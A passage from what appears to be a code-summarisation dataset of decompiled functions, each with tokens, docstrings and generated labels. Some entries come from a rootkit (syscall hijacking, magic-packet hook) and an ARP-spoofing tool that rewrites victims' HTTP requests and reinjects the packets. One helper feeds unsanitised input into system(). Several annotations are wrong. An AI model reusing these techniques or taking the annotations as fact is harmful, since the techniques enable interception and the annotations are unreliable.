            "(",
            "!",
            "(",
            "v32",
            "|",
            "v33",
            ")",
            ")",
            "__asm",
            "{",
            "vaddss",
            "xmm3",
            ",",
            "xmm3",
            ",",
            "cs",
            ":",
            "_LC61",
            "}",
            "__asm",
            "{",
            "vmovss",
            "xmm1",
            ",",
            "dword",
            "ptr",
            "[",
            "rbx",
            "]",
            "vmovss",
            "xmm0",
            ",",
            "dword",
            "ptr",
            "[",
            "rbx",
            "+",
            "4",
            "]",
            "}",
            "}",
            "else",
            "{",
            "__asm",
            "{",
            "vucomiss",
            "xmm0",
            ",",
            "xmm2",
            "}",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v45",
            "<",
            "0x28",
            "|",
            "|",
            "v45",
            "=",
            "=",
            "0L",
            "L",
            ")",
            "{",
            "__asm",
            "{",
            "vmovsd",
            "xmm4",
            ",",
            "cs",
            ":",
            "_LC59",
            "vmovsd",
            "xmm5",
            ",",
            "cs",
            ":",
            "_LC60",
            "vmovss",
            "xmm3",
            ",",
            "cs",
            ":",
            "_LC56",
            "vmovsd",
            "qword",
            "ptr",
            "[",
            "rbp",
            "-",
            "38",
            "h",
            "]",
            ",",
            "xmm4",
            "vmovsd",
            "qword",
            "ptr",
            "[",
            "rbp",
            "-",
            "30",
            "h",
            "]",
            ",",
            "xmm5",
            "}",
            "}",
            "else",
            "{",
            "__asm",
            "{",
            "vmovsd",
            "xmm6",
            ",",
            "cs",
            ":",
            "_LC59",
            "vmovsd",
            "xmm7",
            ",",
            "cs",
            ":",
            "_LC60",
            "vmovss",
            "xmm3",
            ",",
            "cs",
            ":",
            "_LC57",
            "vmovsd",
            "qword",
            "ptr",
            "[",
            "rbp",
            "-",
            "38",
            "h",
            "]",
            ",",
            "xmm6",
            "vmovsd",
            "qword",
            "ptr",
            "[",
            "rbp",
            "-",
            "30",
            "h",
            "]",
            ",",
            "xmm7",
            "}",
            "}",
            "}",
            "__asm",
            "{",
            "vmulss",
            "xmm1",
            ",",
            "xmm1",
            ",",
            "xmm1",
            "vmovss",
            "dword",
            "ptr",
            "[",
            "rbp",
            "-",
            "28",
            "h",
            "]",
            ",",
            "xmm2",
            "vmovss",
            "dword",
            "ptr",
            "[",
            "rbp",
            "-",
            "24",
            "h",
            "]",
            ",",
            "xmm3",
            "vmulss",
            "xmm0",
            ",",
            "xmm0",
            ",",
            "xmm0",
            "vaddss",
            "xmm0",
            ",",
            "xmm1",
            ",",
            "xmm0",
            "vcvtss2sd",
            "xmm0",
            ",",
            "xmm0",
            ",",
            "xmm0",
            ";",
            "x",
            "}",
            "*",
            "(",
            "double",
            "*",
            ")",
            "&",
            "_XMM0",
            "=",
            "sqrt",
            "(",
            "*",
            "(",
            "double",
            "*",
            ")",
            "&",
            "_XMM0",
            ")",
            ";",
            "__asm",
            "{",
            "vcvtsd2ss",
            "xmm1",
            ",",
            "xmm1",
            ",",
            "xmm0",
            "vcvtss2sd",
            "xmm0",
            ",",
            "xmm0",
            ",",
            "dword",
            "ptr",
            "[",
            "rbx",
            "+",
            "8",
            "]",
            ";",
            "y",
            "vcvtss2sd",
            "xmm1",
            ",",
            "xmm1",
            ",",
            "xmm1",
            ";",
            "x",
            "}",
            "*",
            "(",
            "double",
            "*",
            ")",
            "&",
            "_XMM0",
            "=",
            "atan2",
            "(",
            "*",
            "(",
            "double",
            "*",
            ")",
            "&",
            "_XMM0",
            ",",
            "*",
            "(",
            "double",
            "*",
            ")",
            "&",
            "_XMM1",
            ")",
            ";",
            "__asm",
            "{",
            "vmovss",
            "xmm2",
            ",",
            "dword",
            "ptr",
            "[",
            "rbp",
            "-",
            "28",
            "h",
            "]",
            "vmulsd",
            "xmm0",
            ",",
            "xmm0",
            ",",
            "qword",
            "ptr",
            "[",
            "rbp",
            "-",
            "38",
            "h",
            "]",
            "vmovss",
            "xmm3",
            ",",
            "dword",
            "ptr",
            "[",
            "rbp",
            "-",
            "24",
            "h",
            "]",
            "vdivsd",
            "xmm0",
            ",",
            "xmm0",
            ",",
            "qword",
            "ptr",
            "[",
            "rbp",
            "-",
            "30",
            "h",
            "]",
            "vcvtsd2ss",
            "xmm0",
            ",",
            "xmm0",
            ",",
            "xmm0",
            "vucomiss",
            "xmm2",
            ",",
            "xmm0",
            "}",
            "if",
            "(",
            "!",
            "(",
            "v32",
            "|",
            "v33",
            ")",
            ")",
            "__asm",
            "{",
            "vaddss",
            "xmm0",
            ",",
            "xmm0",
            ",",
            "cs",
            ":",
            "_LC61",
            "}",
            "__asm",
            "{",
            "vmovss",
            "xmm1",
            ",",
            "cs",
            ":",
            "_LC32",
            "vxorps",
            "xmm0",
            ",",
            "xmm0",
            ",",
            "xmm1",
            "}",
            "}",
            "else",
            "{",
            "__asm",
            "{",
            "vmovss",
            "xmm0",
            ",",
            "dword",
            "ptr",
            "[",
            "rdi",
            "+",
            "8",
            "]",
            "vucomiss",
            "xmm0",
            ",",
            "xmm2",
            "}",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v45",
            "<",
            "0x28",
            "|",
            "|",
            "v45",
            "=",
            "=",
            "0L",
            "L",
            ")",
            "{",
            "__asm",
            "{",
            "vmovss",
            "xmm0",
            ",",
            "cs",
            ":",
            "_LC54",
            "vmovss",
            "xmm3",
            ",",
            "xmm3",
            ",",
            "xmm2",
            "}",
            "}",
            "else",
            "{",
            "__asm",
            "{",
            "vmovss",
            "xmm0",
            ",",
            "cs",
            ":",
            "_LC55",
            "vmovss",
            "xmm3",
            ",",
            "xmm3",
            ",",
            "xmm2",
            "}",
            "}",
            "}",
            "__asm",
            "{",
            "vmovss",
            "dword",
            "ptr",
            "[",
            "r12",
            "]",
            ",",
            "xmm0",
            "vmovss",
            "dword",
            "ptr",
            "[",
            "r12",
            "+",
            "4",
            "]",
            ",",
            "xmm3",
            "}",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "a2",
            "+",
            "2",
            ")",
            "=",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code appears to be a function named `VectorToAngles` written in assembly language, which likely converts a vector to angles, with optimizations and conditional branches based on comparisons and mathematical operations."
    },
    {
        "id": 474,
        "docstring_tokens": [
            "The",
            "code",
            "initializes",
            "the",
            "anhackit",
            "rootkit",
            "by",
            "hijacking",
            "system",
            "calls",
            ",",
            "loading",
            "a",
            "magic",
            "packet",
            "hook",
            ",",
            "and",
            "deleting",
            "module-related",
            "lists",
            "and",
            "objects",
            "if",
            "not",
            "in",
            "debug",
            "mode",
            ",",
            "otherwise",
            "printing",
            "a",
            "debug",
            "message",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            ")",
            "{",
            "_fentry__",
            "(",
            ")",
            ";",
            "hijack_write_sys_call",
            "(",
            ")",
            ";",
            "load_magic_packet_hook",
            "(",
            ")",
            ";",
            "printk",
            "(",
            "\"anhackit - rootkit loaded!\\n\"",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"start\" function likely serves as an entry point or initialization function for a program or module, declaring buffers and static utility functions, along with defining various global variables and external declarations required for the program's operation.",
            "The function `fentry__` seems to be related to function tracing mechanisms like ftrace, providing a hook for tracing entry into functions while handling considerations for recursion and stack manipulation.",
            "The function `ijack_write` appears to be involved in hijacking I/O operations, potentially for SSH-related activities, by intercepting write operations and logging them, likely for the purpose of monitoring or modifying data streams.",
            "The function `sys_callload_magic_packet_hookprintk` likely hooks into the system call handling mechanism to intercept and log events related to magic packet loading, possibly for debugging or monitoring purposes."
        ],
        "longer_label": "Based on the provided code and annotations, the `anhackit_start` function serves as the rootkit's entry point, initializing necessary hooks for system call hijacking, magic packet handling, and printing a confirmation message upon successful loading."
    },
    {
        "id": 475,
        "docstring_tokens": [
            "The",
            "code",
            "retrieves",
            "the",
            "MAC",
            "address",
            "from",
            "an",
            "IP",
            "address",
            "by",
            "pinging",
            "the",
            "IP",
            "and",
            "then",
            "using",
            "the",
            "arp",
            "command",
            "to",
            "extract",
            "the",
            "MAC",
            "address",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ",",
            "__int64",
            "a2",
            ")",
            "{",
            "char",
            "s",
            "[",
            "104",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v4",
            ";",
            "v4",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "memset",
            "(",
            "s",
            ",",
            "0",
            ",",
            "100",
            ")",
            ";",
            "sprintf",
            "(",
            "s",
            ",",
            "\"ping -c1 %s > NIL\"",
            ",",
            "a1",
            ")",
            ";",
            "system",
            "(",
            "s",
            ")",
            ";",
            "memset",
            "(",
            "s",
            ",",
            "0",
            ",",
            "0x64uL",
            "L",
            ")",
            ";",
            "sprintf",
            "(",
            "s",
            ",",
            "\"arp -a -n | grep %s\"",
            ",",
            "a1",
            ")",
            ";",
            "Get_MAC_From_Terminal",
            "(",
            "s",
            ",",
            "a2",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"Mac_From_IP\" likely takes an IP address as input and retrieves the corresponding MAC (Media Access Control) address from the network, facilitating network communication or device identification based on IP-MAC mapping.",
            "The function `__readfsqword` is used to read an unsigned 64-bit integer from the segment specified by the FS register, typically utilized in low-level programming for accessing thread information or processor-specific data structures on x86 architectures.",
            "The function `memset` is being defined and implemented with variations across multiple code snippets, providing functionalities such as memory allocation, reallocation, zero initialization, and memory manipulation using built-in compiler functions like `__builtin_memset`, `__builtin_memmove`, `__builtin_memcpy`, and `__builtin_memcmp`.",
            "The `sprintf` function is used to format and store a series of characters and values into a character array in C programming, allowing for formatted string creation similar to `printf`, but with output directed to a string buffer rather than stdout.",
            "The `Get function, `Get_MAC_From_IP`, is designed to obtain the MAC address corresponding to a given IP address by creating an ARP entry for the IP in the network and then retrieving its MAC address using system commands and terminal operations."
        ],
        "longer_label": "The code defines a function, \"Get_Mac_From_IP\", which likely takes an IP address as input, executes a system command to ping the given IP address and retrieve its MAC address using ARP (Address Resolution Protocol), and returns 0, while incorporating low-level functions like `__readfsqword` and `memset` for memory manipulation."
    },
    {
        "id": 476,
        "docstring_tokens": [
            "The",
            "code",
            "retrieves",
            "the",
            "MAC",
            "address",
            "from",
            "a",
            "terminal",
            "command",
            "by",
            "using",
            "a",
            "pipe",
            "operator",
            "to",
            "filter",
            "the",
            "output",
            "with",
            "GREP_MAC",
            ",",
            "then",
            "reads",
            "the",
            "MAC",
            "address",
            "from",
            "the",
            "command",
            "stream",
            "and",
            "converts",
            "it",
            "to",
            "a",
            "u_char",
            "array",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ",",
            "__int64",
            "a2",
            ")",
            "{",
            "FILE",
            "*",
            "stream",
            ";",
            "char",
            "v4",
            "[",
            "8",
            "]",
            ";",
            "__int64",
            "v5",
            ";",
            "__int16",
            "v6",
            ";",
            "char",
            "v7",
            ";",
            "char",
            "s",
            "[",
            "8",
            "]",
            ";",
            "__int64",
            "v9",
            ";",
            "__int64",
            "v10",
            ";",
            "__int64",
            "v11",
            ";",
            "__int64",
            "v12",
            ";",
            "__int64",
            "v13",
            ";",
            "__int64",
            "v14",
            ";",
            "__int64",
            "v15",
            ";",
            "__int64",
            "v16",
            ";",
            "__int64",
            "v17",
            ";",
            "__int64",
            "v18",
            ";",
            "__int64",
            "v19",
            ";",
            "int",
            "v20",
            ";",
            "unsigned",
            "__int64",
            "v21",
            ";",
            "v21",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "s",
            "=",
            "0L",
            "L",
            ";",
            "v9",
            "=",
            "0L",
            "L",
            ";",
            "v10",
            "=",
            "0L",
            "L",
            ";",
            "v11",
            "=",
            "0L",
            "L",
            ";",
            "v12",
            "=",
            "0L",
            "L",
            ";",
            "v13",
            "=",
            "0L",
            "L",
            ";",
            "v14",
            "=",
            "0L",
            "L",
            ";",
            "v15",
            "=",
            "0L",
            "L",
            ";",
            "v16",
            "=",
            "0L",
            "L",
            ";",
            "v17",
            "=",
            "0L",
            "L",
            ";",
            "v18",
            "=",
            "0L",
            "L",
            ";",
            "v19",
            "=",
            "0L",
            "L",
            ";",
            "v20",
            "=",
            "0",
            ";",
            "sprintf",
            "(",
            "s",
            ",",
            "\"%s | %s\"",
            ",",
            "a1",
            ",",
            "\"grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'\"",
            ")",
            ";",
            "stream",
            "=",
            "popen",
            "(",
            "s",
            ",",
            "\"r\"",
            ")",
            ";",
            "if",
            "(",
            "stream",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v4",
            "=",
            "0L",
            "L",
            ";",
            "v5",
            "=",
            "0L",
            "L",
            ";",
            "v6",
            "=",
            "0",
            ";",
            "v7",
            "=",
            "0",
            ";",
            "if",
            "(",
            "fgets",
            "(",
            "v4",
            ",",
            "18",
            ",",
            "stream",
            ")",
            ")",
            "mac_ston",
            "(",
            "v4",
            ",",
            "a2",
            ")",
            ";",
            "pclose",
            "(",
            "stream",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "printf",
            "(",
            "\"CHECK FAILED: %s\\n\"",
            ",",
            "\"command_stream\"",
            ")",
            ";",
            "return",
            "1L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code is a function named `Get_MAC_From_Terminal` which takes a string `a1` and an integer `a2` as arguments, and it uses `pop` and `grep` commands to extract MAC addresses from the terminal output, storing the result in `v4` and passing it to the `mac_ston` function if successful, otherwise, it prints a failure message."
    },
    {
        "id": 477,
        "docstring_tokens": [
            "The",
            "code",
            "handles",
            "an",
            "IP",
            "packet",
            "by",
            "checking",
            "if",
            "it",
            "is",
            "from",
            "the",
            "victim",
            "towards",
            "the",
            "gateway",
            ",",
            "modifying",
            "the",
            "packet",
            "if",
            "it",
            "contains",
            "a",
            "specific",
            "URI",
            ",",
            "calculating",
            "and",
            "updating",
            "the",
            "checksum",
            ",",
            "and",
            "injecting",
            "the",
            "modified",
            "packet",
            "into",
            "the",
            "network",
            "."
        ],
        "code_tokens": [
            "int",
            "__fastcall",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ",",
            "__int64",
            "a2",
            ",",
            "_BYTE",
            "*",
            "a3",
            ")",
            "{",
            "int",
            "result",
            ";",
            "const",
            "char",
            "*",
            "v4",
            ";",
            "uint16_t",
            "v6",
            ";",
            "size_t",
            "n",
            ";",
            "__int16",
            "v8",
            ";",
            "_WORD",
            "s",
            "[",
            "764",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v10",
            ";",
            "v10",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "puts",
            "(",
            "\"Handling IP packet..\"",
            ")",
            ";",
            "n",
            "=",
            "*",
            "(",
            "unsigned",
            "int",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "16",
            ")",
            ";",
            "memset",
            "(",
            "s",
            ",",
            "0",
            ",",
            "0x5EEuL",
            "L",
            ")",
            ";",
            "memcpy",
            "(",
            "s",
            ",",
            "a3",
            ",",
            "n",
            ")",
            ";",
            "result",
            "=",
            "memcmp",
            "(",
            "a3",
            "+",
            "6",
            ",",
            "a1",
            "+",
            "22",
            ",",
            "6uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "result",
            ")",
            "{",
            "puts",
            "(",
            "\"[IP] From victim towards Gateway\"",
            ")",
            ";",
            "if",
            "(",
            "a3",
            "[",
            "23",
            "]",
            "=",
            "=",
            "6",
            "&",
            "&",
            "!",
            "memcmp",
            "(",
            "&",
            "s",
            "[",
            "35",
            "]",
            ",",
            "http_get_request_changec",
            ",",
            "0xAuL",
            "L",
            ")",
            ")",
            "{",
            "puts",
            "(",
            "\"Found Dr. Chang's URI\"",
            ")",
            ";",
            "if",
            "(",
            "!",
            "strcmp",
            "(",
            "a1",
            "+",
            "8",
            ",",
            "\"liangzk\"",
            ")",
            ")",
            "{",
            "qmemcpy",
            "(",
            "&",
            "s",
            "[",
            "35",
            "]",
            ",",
            "\"/~liangzk/\"",
            ",",
            "10",
            ")",
            ";",
            "}",
            "else",
            "if",
            "(",
            "!",
            "strcmp",
            "(",
            "a1",
            "+",
            "8",
            ",",
            "\"chanmc\"",
            ")",
            ")",
            "{",
            "qmemcpy",
            "(",
            "&",
            "s",
            "[",
            "35",
            "]",
            ",",
            "\"",
            "/",
            "~",
            "chanmc",
            "}",
            "memset",
            "(",
            "&",
            "s",
            "[",
            "25",
            "]",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "_WORD",
            ")",
            ")",
            ";",
            "v6",
            "=",
            "Calculate_Pseudo_Checksum",
            "(",
            "(",
            "__int64",
            ")",
            "s",
            ",",
            "n",
            ")",
            ";",
            "LOBYTE",
            "(",
            "v8",
            ")",
            "=",
            "htons",
            "(",
            "v6",
            ")",
            ">",
            ">",
            "8",
            ";",
            "HIBYTE",
            "(",
            "v8",
            ")",
            "=",
            "htons",
            "(",
            "v6",
            ")",
            ";",
            "s",
            "[",
            "25",
            "]",
            "=",
            "v8",
            ";",
            "}",
            "memcpy",
            "(",
            "s",
            ",",
            "a1",
            "+",
            "28",
            ",",
            "6uL",
            "L",
            ")",
            ";",
            "memcpy",
            "(",
            "&",
            "s",
            "[",
            "3",
            "]",
            ",",
            "a1",
            "+",
            "16",
            ",",
            "6uL",
            "L",
            ")",
            ";",
            "result",
            "=",
            "pcap_inject",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "a1",
            ",",
            "s",
            ",",
            "n",
            ")",
            ";",
            "if",
            "(",
            "result",
            "=",
            "=",
            "-",
            "1L",
            "L",
            ")",
            "{",
            "v4",
            "=",
            "(",
            "const",
            "char",
            "*",
            ")",
            "pcap_geterr",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "a1",
            ")",
            ";",
            "fprintf",
            "(",
            "stderr",
            ",",
            "\"TCP Packet injection failed: %s\\n\"",
            ",",
            "v4",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is used to read a 64-bit value from the FS segment register at a specified offset, primarily intended for low-level system programming tasks such as accessing thread information block (TIB) on Windows platforms.",
            "The provided code snippets and the function name \"memcmp\" suggest that it is likely used for comparing memory blocks, as indicated by the presence of a comparison function (`eqx`) utilizing `memcmp`, and external declarations indicating memory comparison functions, implying its role in byte-by-byte comparison of memory regions, typically for equality checks or sorting purposes.",
            "",
            "The function `mcmemset` is likely designed to perform a memory set operation, similar to the standard C library function `memset`, but possibly customized or optimized for a specific context or usage scenario.",
            "Without the actual code snippets, it's challenging to provide a precise analysis. However, based solely on the function name \"Calculate,\" it likely performs mathematical or computational operations and possibly returns a result.",
            "Based on the name \"Pseudo_Che\" and the absence of code snippets, it seems like this function is intended to perform a pseudo-randomized search or generate pseudo-random numbers according to some unspecified algorithm."
        ],
        "longer_label": "The code is a function for handling IP packets, which includes tasks such as reading a 64-bit value from the FS segment register, comparing memory blocks for equality checks, and injecting TCP packets using pcap_inject."
    },
    {
        "id": 478,
        "docstring_tokens": [
            "The",
            "code",
            "calculates",
            "a",
            "checksum",
            "value",
            "for",
            "a",
            "given",
            "buffer",
            "of",
            "data",
            "by",
            "summing",
            "up",
            "the",
            "values",
            "in",
            "the",
            "buffer",
            ",",
            "handling",
            "endianness",
            ",",
            "and",
            "returning",
            "the",
            "checksum",
            "as",
            "a",
            "unsigned",
            "short",
            "value",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "unsigned",
            "__int16",
            "*",
            "a1",
            ",",
            "unsigned",
            "__int64",
            "a2",
            ")",
            "{",
            "unsigned",
            "__int16",
            "*",
            "v2",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "v6",
            "=",
            "0L",
            "L",
            ";",
            "while",
            "(",
            "a2",
            ">",
            "1",
            ")",
            "{",
            "v2",
            "=",
            "a1",
            "+",
            "+",
            ";",
            "v6",
            "+",
            "=",
            "*",
            "v2",
            ";",
            "a2",
            "-",
            "=",
            "2L",
            "L",
            ";",
            "}",
            "if",
            "(",
            "a2",
            ")",
            "v6",
            "+",
            "=",
            "*",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "a1",
            ";",
            "while",
            "(",
            "v6",
            ">",
            ">",
            "16",
            ")",
            "v6",
            "=",
            "(",
            "v6",
            ">",
            ">",
            "16",
            ")",
            "+",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v6",
            ";",
            "return",
            "(",
            "unsigned",
            "int",
            ")",
            "~",
            "(",
            "_DWORD",
            ")",
            "v6",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"Checks\" function appears to be a set of macros and functions used for checking and manipulating the internal numeric representation (NV/IV) of Perl scalar values (SVs), providing methods to determine if an SV contains a number, integer, or double, and to unset the NV/IV status."
        ],
        "longer_label": "The provided code appears to be a function named `Calculate_Checksum` which computes a checksum value for a given array of unsigned 16-bit integers, with additional annotations suggesting its potential context within a Perl interpreter's \"Checks\" function set for managing numeric representations."
    },
    {
        "id": 479,
        "docstring_tokens": [
            "The",
            "code",
            "calculates",
            "a",
            "pseudo",
            "TCP",
            "checksum",
            "by",
            "extracting",
            "data",
            "from",
            "the",
            "IP",
            "header",
            "and",
            "creating",
            "a",
            "pseudo",
            "TCP",
            "header",
            ",",
            "then",
            "calculating",
            "the",
            "checksum",
            "of",
            "the",
            "pseudo",
            "header",
            "combined",
            "with",
            "the",
            "packet",
            "data",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "__int64",
            "a2",
            ")",
            "{",
            "int",
            "v2",
            ";",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "void",
            "*",
            "v4",
            ";",
            "__int64",
            "v6",
            ";",
            "__int64",
            "v7",
            ";",
            "__int16",
            "v8",
            ";",
            "__int64",
            "v9",
            ";",
            "__int64",
            "v10",
            ";",
            "void",
            "*",
            "s",
            ";",
            "int",
            "v12",
            ";",
            "int",
            "v13",
            ";",
            "char",
            "v14",
            ";",
            "char",
            "v15",
            ";",
            "unsigned",
            "__int16",
            "v16",
            ";",
            "__int16",
            "v17",
            ";",
            "unsigned",
            "__int64",
            "v18",
            ";",
            "v7",
            "=",
            "a1",
            ";",
            "v6",
            "=",
            "a2",
            ";",
            "v18",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v8",
            "=",
            "0",
            ";",
            "v9",
            "=",
            "a1",
            "+",
            "14",
            ";",
            "v12",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "26",
            ")",
            ";",
            "v13",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "30",
            ")",
            ";",
            "v14",
            "=",
            "0",
            ";",
            "v15",
            "=",
            "6",
            ";",
            "v16",
            "=",
            "a2",
            "-",
            "34",
            ";",
            "printf",
            "(",
            "\"Pseudo data length to be checksummed :\\n\"",
            ")",
            ";",
            "LOBYTE",
            "(",
            "v17",
            ")",
            "=",
            "(",
            "unsigned",
            "__int16",
            ")",
            "(",
            "a2",
            "-",
            "34",
            ")",
            ">",
            ">",
            "8",
            ";",
            "HIBYTE",
            "(",
            "v17",
            ")",
            "=",
            "a2",
            "-",
            "34",
            ";",
            "v2",
            "=",
            "(",
            "unsigned",
            "__int16",
            ")",
            "(",
            "a2",
            "-",
            "34",
            ")",
            "+",
            "12",
            ";",
            "v10",
            "=",
            "v2",
            "-",
            "1L",
            "L",
            ";",
            "v3",
            "=",
            "16",
            "*",
            "(",
            "(",
            "v2",
            "+",
            "15L",
            "L",
            ")",
            "/",
            "0x10uL",
            "L",
            ")",
            ";",
            "while",
            "(",
            "&",
            "v6",
            "!",
            "=",
            "(",
            "__int64",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "&",
            "v6",
            "-",
            "(",
            "v3",
            "&",
            "0xFFFFFFFFFFFFF000L",
            "L",
            ")",
            ")",
            ")",
            ";",
            "v4",
            "=",
            "alloca",
            "(",
            "v3",
            "&",
            "0xFFF",
            ")",
            ";",
            "if",
            "(",
            "(",
            "v3",
            "&",
            "0xFFF",
            ")",
            "!",
            "=",
            "0",
            ")",
            "*",
            "(",
            "__int64",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "&",
            "v6",
            "+",
            "(",
            "v3",
            "&",
            "0xFFF",
            ")",
            "-",
            "8",
            ")",
            "=",
            "*",
            "(",
            "__int64",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "&",
            "v6",
            "+",
            "(",
            "v3",
            "&",
            "0xFFF",
            ")",
            "-",
            "8",
            ")",
            ";",
            "s",
            "=",
            "&",
            "v6",
            ";",
            "memset",
            "(",
            "&",
            "v6",
            ",",
            "0",
            ",",
            "v16",
            "+",
            "12",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "s",
            "=",
            "v12",
            ";",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "s",
            "+",
            "1",
            ")",
            "=",
            "v13",
            ";",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "s",
            "+",
            "8",
            ")",
            "=",
            "v14",
            ";",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "s",
            "+",
            "9",
            ")",
            "=",
            "v15",
            ";",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "s",
            "+",
            "5",
            ")",
            "=",
            "v17",
            ";",
            "memcpy",
            "(",
            "(",
            "char",
            "*",
            ")",
            "s",
            "+",
            "12",
            ",",
            "(",
            "const",
            "void",
            "*",
            ")",
            "(",
            "v7",
            "+",
            "34",
            ")",
            ",",
            "v16",
            ")",
            ";",
            "return",
            "(",
            "unsigned",
            "__int16",
            ")",
            "Calculate_Checksum",
            "(",
            "(",
            "unsigned",
            "__int16",
            "*",
            ")",
            "s",
            ",",
            "v16",
            "+",
            "12",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The code appears to be a function named `Calculate_Pseudo_Checksum` that calculates a checksum for pseudo data based on input parameters `a1` and `a2`, including memory operations and checksum calculation using `Calculate_Checksum`."
    },
    {
        "id": 480,
        "docstring_tokens": [
            "The",
            "function",
            "h_print_register",
            "prints",
            "the",
            "register",
            "status",
            "of",
            "a",
            "given",
            "process",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "t_process",
            "*",
            "cp",
            ")",
            "{",
            "char",
            "v1",
            ";",
            "int",
            "i",
            ";",
            "i",
            "=",
            "0",
            ";",
            "printf",
            "(",
            "\"register status: [\"",
            ")",
            ";",
            "while",
            "(",
            "i",
            "<",
            "=",
            "15",
            ")",
            "{",
            "v1",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "cp",
            "-",
            ">",
            "registers",
            "[",
            "i",
            "]",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v1",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "4",
            "*",
            "i",
            "+",
            "(",
            "_BYTE",
            ")",
            "cp",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "v1",
            ")",
            "_asan_report_load4",
            "(",
            "&",
            "cp",
            "-",
            ">",
            "registers",
            "[",
            "i",
            "]",
            ")",
            ";",
            "printf",
            "(",
            "\" %d | \"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "cp",
            "-",
            ">",
            "registers",
            "[",
            "i",
            "+",
            "+",
            "]",
            ")",
            ";",
            "}",
            "puts",
            "(",
            "\"]\"",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `printf` function in this context seems to be a modified version used for formatting and outputting text, likely tailored for specific platforms and potentially extended for specialized tasks like an RPN calculator, featuring custom type definitions and macros.",
            "The function \"asan_report_load4\" is likely part of a memory error detection tool (such as AddressSanitizer or KASan) used for reporting memory access violations of 4-byte loads in a program."
        ],
        "longer_label": "The provided code is a function `h_print_register` which prints the status of registers in a process, potentially for debugging purposes, while also incorporating memory error detection using a function `_asan_report_load4`."
    },
    {
        "id": 481,
        "docstring_tokens": [
            "The",
            "code",
            "retrieves",
            "the",
            "gateway",
            "IP",
            "address",
            "by",
            "parsing",
            "the",
            "output",
            "of",
            "the",
            "``",
            "/sbin/ip",
            "route",
            "|",
            "awk",
            "'/default/",
            "{",
            "print",
            "$",
            "3",
